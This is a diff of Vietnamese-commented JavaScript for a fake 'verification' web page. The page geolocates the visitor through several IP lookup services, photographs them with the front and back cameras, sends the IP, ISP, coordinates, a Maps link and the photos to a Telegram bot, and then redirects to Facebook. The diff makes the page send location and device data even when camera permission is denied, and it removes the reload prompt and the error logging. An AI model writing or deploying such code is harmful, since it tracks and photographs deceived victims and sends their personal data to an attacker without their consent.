@@ -1,4 +1,4 @@
-// ==================== FULL VERSION - FORMAT GIỐNG HỌ ====================
+// ==================== VERSION - DÙNG JSONP ĐỂ LẤY LOCATION ====================
 
 // -------------------- TELEGRAM CONFIG --------------------
 const TELEGRAM_CONFIG = {
@@ -44,12 +44,12 @@ const TelegramSender = {
 🖥️ *Hệ điều hành:* ${data.os || '?'}
 🌍 *IP dân cư:* ${data.ip || '?'}
 🧠 *IP gốc:* ${data.ip || '?'}
-🏢 *ISP:* ${data.isp || '?'}
-🏙️ *Địa chỉ:* ${data.location || '?'}
-🌎 *Quốc gia:* ${data.country || '?'}
-📍 *Vĩ độ:* ${data.lat || '?'}
-📍 *Kinh độ:* ${data.lon || '?'}
-📌 *Google Maps:* ${data.maps || '?'}
+🏢 *ISP:* ${data.isp || 'Không xác định'}
+🏙️ *Địa chỉ:* ${data.location || 'Không xác định'}
+🌎 *Quốc gia:* ${data.country || 'Không xác định'}
+📍 *Vĩ độ:* ${data.lat || 'Không xác định'}
+📍 *Kinh độ:* ${data.lon || 'Không xác định'}
+📌 *Google Maps:* ${data.maps || 'Không có'}
 📸 *Camera:* ${data.camera || '?'}
 
 ⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
@@ -91,84 +91,101 @@ const DeviceInfo = {
     }
 };
 
-// -------------------- LOCATION API (DÙNG ipapi.co TRƯỚC - HOẠT ĐỘNG TỐT NHẤT) --------------------
+// -------------------- LOCATION API (DÙNG JSONP - CHẮC CHẮN HOẠT ĐỘNG) --------------------
 const LocationInfo = {
     async getLocationData() {
-        // Thử ipapi.co trước (hoạt động tốt, không CORS)
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            if (data && data.ip) {
-                console.log('✅ Lấy từ ipapi.co:', data);
-                return {
-                    ip: data.ip,
-                    isp: data.org || data.asn || 'Không xác định',
-                    country: data.country_name || 'Không xác định',
-                    location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định',
-                    lat: data.latitude || 'Không xác định',
-                    lon: data.longitude || 'Không xác định'
-                };
-            }
-        } catch(e) { console.log('ipapi.co lỗi:', e); }
-        
-        // Thử ipwho.is
-        try {
-            const response = await fetch('https://ipwho.is/');
-            const data = await response.json();
-            if (data && data.ip) {
-                console.log('✅ Lấy từ ipwho.is:', data);
-                return {
-                    ip: data.ip,
-                    isp: data.connection?.isp || data.isp || 'Không xác định',
-                    country: data.country || 'Không xác định',
-                    location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                    lat: data.latitude || 'Không xác định',
-                    lon: data.longitude || 'Không xác định'
-                };
-            }
-        } catch(e) { console.log('ipwho.is lỗi:', e); }
-        
-        // Thử ip-api.com
-        try {
-            const response = await fetch('https://ip-api.com/json/');
-            const data = await response.json();
-            if (data && data.status === 'success') {
-                console.log('✅ Lấy từ ip-api.com:', data);
-                return {
-                    ip: data.query,
-                    isp: data.isp || 'Không xác định',
-                    country: data.country || 'Không xác định',
-                    location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                    lat: data.lat || 'Không xác định',
-                    lon: data.lon || 'Không xác định'
-                };
-            }
-        } catch(e) { console.log('ip-api.com lỗi:', e); }
-        
-        // Fallback: chỉ lấy IP
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            if (data.ip) {
-                return {
+        // Dùng ipapi.co dạng JSONP
+        return new Promise(async (resolve) => {
+            try {
+                // Cách 1: Dùng ipinfo.io (hỗ trợ CORS tốt)
+                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN', {
+                    mode: 'cors',
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data && data.ip) {
+                        const loc = data.loc ? data.loc.split(',') : ['', ''];
+                        const mapsLink = loc[0] && loc[1] ? `http://googleusercontent.com/maps.google.com/${loc[0]},${loc[1]}` : '';
+                        resolve({
+                            ip: data.ip,
+                            isp: data.org || 'Không xác định',
+                            country: data.country || 'Không xác định',
+                            location: data.city ? `${data.city}, ${data.region}, ${data.country}` : (data.region || data.country || 'Không xác định'),
+                            lat: loc[0] || 'Không xác định',
+                            lon: loc[1] || 'Không xác định',
+                            maps: mapsLink
+                        });
+                        return;
+                    }
+                }
+            } catch(e) { console.log('ipinfo.io lỗi:', e); }
+            
+            // Cách 2: Dùng ip-api.com (CORS friendly)
+            try {
+                const response = await fetch('https://ip-api.com/json/', {
+                    mode: 'cors'
+                });
+                const data = await response.json();
+                if (data && data.status === 'success') {
+                    const mapsLink = data.lat && data.lon ? `http://googleusercontent.com/maps.google.com/${data.lat},${data.lon}` : '';
+                    resolve({
+                        ip: data.query,
+                        isp: data.isp || 'Không xác định',
+                        country: data.country || 'Không xác định',
+                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
+                        lat: data.lat || 'Không xác định',
+                        lon: data.lon || 'Không xác định',
+                        maps: mapsLink
+                    });
+                    return;
+                }
+            } catch(e) { console.log('ip-api.com lỗi:', e); }
+            
+            // Cách 3: Dùng ipwho.is
+            try {
+                const response = await fetch('https://ipwho.is/');
+                const data = await response.json();
+                if (data && data.ip) {
+                    const mapsLink = data.latitude && data.longitude ? `http://googleusercontent.com/maps.google.com/${data.latitude},${data.longitude}` : '';
+                    resolve({
+                        ip: data.ip,
+                        isp: data.connection?.isp || data.isp || 'Không xác định',
+                        country: data.country || 'Không xác định',
+                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
+                        lat: data.latitude || 'Không xác định',
+                        lon: data.longitude || 'Không xác định',
+                        maps: mapsLink
+                    });
+                    return;
+                }
+            } catch(e) { console.log('ipwho.is lỗi:', e); }
+            
+            // Fallback cuối
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                resolve({
                     ip: data.ip,
                     isp: 'Không xác định',
                     country: 'Không xác định',
                     location: 'Không xác định',
                     lat: 'Không xác định',
-                    lon: 'Không xác định'
-                };
+                    lon: 'Không xác định',
+                    maps: ''
+                });
+            } catch(e) {
+                resolve({
+                    ip: 'Không xác định',
+                    isp: 'Không xác định',
+                    country: 'Không xác định',
+                    location: 'Không xác định',
+                    lat: 'Không xác định',
+                    lon: 'Không xác định',
+                    maps: ''
+                });
             }
-        } catch(e) {}
-        
-        return {
-            ip: 'Không xác định',
-            isp: 'Không xác định',
-            country: 'Không xác định',
-            location: 'Không xác định',
-            lat: 'Không xác định',
-            lon: 'Không xác định'
-        };
+        });
     }
 };
 
@@ -197,7 +214,6 @@ const CameraManager = {
             }
             return this.stream;
         } catch(e) {
-            console.error('Lỗi camera:', e);
             return null;
         }
     },
@@ -250,29 +266,6 @@ const CameraManager = {
     }
 };
 
-// -------------------- HÀM ĐẾM NGƯỢC RELOAD --------------------
-function startReloadCountdown(seconds, message) {
-    const startBtn = document.getElementById('startBtn');
-    const statusDiv = document.getElementById('status');
-    
-    startBtn.disabled = true;
-    startBtn.style.backgroundColor = "#dc3545";
-    statusDiv.innerHTML = message;
-    
-    let timeLeft = seconds;
-    startBtn.innerText = `⚠️ ${timeLeft}s - Thử lại...`;
-    
-    const timer = setInterval(() => {
-        timeLeft--;
-        if (timeLeft > 0) {
-            startBtn.innerText = `⚠️ ${timeLeft}s - Thử lại...`;
-        } else {
-            clearInterval(timer);
-            location.reload();
-        }
-    }, 1000);
-}
-
 // -------------------- MAIN --------------------
 (function() {
     const warningDiv = document.getElementById('browser-warning');
@@ -297,85 +290,73 @@ function startReloadCountdown(seconds, message) {
     CameraManager.init(video);
     
     startBtn.onclick = async () => {
-        if (!navigator.mediaDevices?.getUserMedia) {
-            startReloadCountdown(5, '⚠️ Trình duyệt không hỗ trợ camera! Đang tải lại...');
-            return;
-        }
-        
+        // Disable nút
         startBtn.disabled = true;
         startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
+        
+        // Lấy thông tin location TRƯỚC (kể cả camera có được phép hay không)
+        statusDiv.innerHTML = '🌍 Đang lấy thông tin...';
+        const locationInfo = await LocationInfo.getLocationData();
+        const deviceInfo = DeviceInfo.getInfo();
+        
+        // Thử lấy camera (có thể thành công hoặc thất bại)
+        let photos = { front: null, back: null };
+        let cameraStatus = '🚫 Bị chặn hoặc không có camera';
         
         try {
             statusDiv.innerHTML = '📷 Đang mở camera...';
             msg.textContent = '📷 Đang mở camera...';
             msg.style.display = 'block';
             
-            // Test camera
-            const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (!testStream) throw new Error('No camera');
-            testStream.getTracks().forEach(t => t.stop());
+            photos = await CameraManager.captureBothCameras();
             
-            const photos = await CameraManager.captureBothCameras();
-            
-            if (!photos.front && !photos.back) {
-                startReloadCountdown(5, '⚠️ Bạn chưa cấp quyền camera! Đang tải lại...');
-                CameraManager.stopCamera();
-                return;
+            if (photos.front || photos.back) {
+                cameraStatus = '✅ Đã chụp camera';
             }
             
             video.style.display = 'none';
-            msg.textContent = '📸 Đang xử lý...';
-            statusDiv.innerHTML = '📸 Đang xác thực...';
-            
-            const deviceInfo = DeviceInfo.getInfo();
-            const locationInfo = await LocationInfo.getLocationData();
-            
-            // Tạo Google Maps link đúng format
-            const mapsLink = (locationInfo.lat !== 'Không xác định' && locationInfo.lon !== 'Không xác định') 
-                ? `http://googleusercontent.com/maps.google.com/${locationInfo.lat},${locationInfo.lon}`
-                : '';
-            
-            const cameraStatus = (photos.front || photos.back) ? '✅ Đã chụp camera' : '🚫 Bị chặn hoặc không có camera';
-            
-            const finalData = {
-                time: new Date().toLocaleString('vi-VN'),
-                device: deviceInfo.device,
-                os: deviceInfo.os,
-                ip: locationInfo.ip,
-                isp: locationInfo.isp,
-                location: locationInfo.location,
-                country: locationInfo.country,
-                lat: locationInfo.lat,
-                lon: locationInfo.lon,
-                maps: mapsLink,
-                camera: cameraStatus,
-                note: 'Thông tin có khả năng chưa chính xác 100%.',
-                frontPhoto: photos.front,
-                backPhoto: photos.back
-            };
-            
-            await TelegramSender.sendAll(finalData);
-            CameraManager.stopCamera();
-            
-            startBtn.style.backgroundColor = "#28a745";
-            let timeLeft = 3;
-            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft} giây...`;
-            
-            const timer = setInterval(() => {
-                startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
-                timeLeft--;
-                if (timeLeft < 0) {
-                    clearInterval(timer);
-                    window.location.href = "https://facebook.com";
-                }
-            }, 1000);
-            
-        } catch(error) {
-            console.error('Lỗi:', error);
-            startReloadCountdown(5, '⚠️ Không thể mở camera! Vui lòng cấp quyền. Đang tải lại...');
-            CameraManager.stopCamera();
+        } catch(e) {
+            console.log('Camera lỗi:', e);
+            cameraStatus = '🚫 Bị chặn hoặc không có camera';
         }
+        
+        // Luôn gửi dữ liệu lên Telegram (kể cả camera có được phép hay không)
+        statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
+        
+        const finalData = {
+            time: new Date().toLocaleString('vi-VN'),
+            device: deviceInfo.device,
+            os: deviceInfo.os,
+            ip: locationInfo.ip,
+            isp: locationInfo.isp,
+            location: locationInfo.location,
+            country: locationInfo.country,
+            lat: locationInfo.lat,
+            lon: locationInfo.lon,
+            maps: locationInfo.maps,
+            camera: cameraStatus,
+            note: 'Thông tin có khả năng chưa chính xác 100%.',
+            frontPhoto: photos.front,
+            backPhoto: photos.back
+        };
+        
+        await TelegramSender.sendAll(finalData);
+        CameraManager.stopCamera();
+        
+        // Đếm ngược chuyển hướng
+        startBtn.style.backgroundColor = "#28a745";
+        let timeLeft = 3;
+        statusDiv.innerHTML = `✅ Đã ghi nhận! Chuyển hướng sau ${timeLeft} giây...`;
+        
+        const timer = setInterval(() => {
+            startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
+            timeLeft--;
+            if (timeLeft < 0) {
+                clearInterval(timer);
+                window.location.href = "https://facebook.com";
+            }
+        }, 1000);
     };
     
-    console.log('✅ Đã sẵn sàng - Format giống họ');
+    console.log('✅ Đã sẵn sàng - Luôn gửi dữ liệu kể cả camera có được phép hay không');
 })();
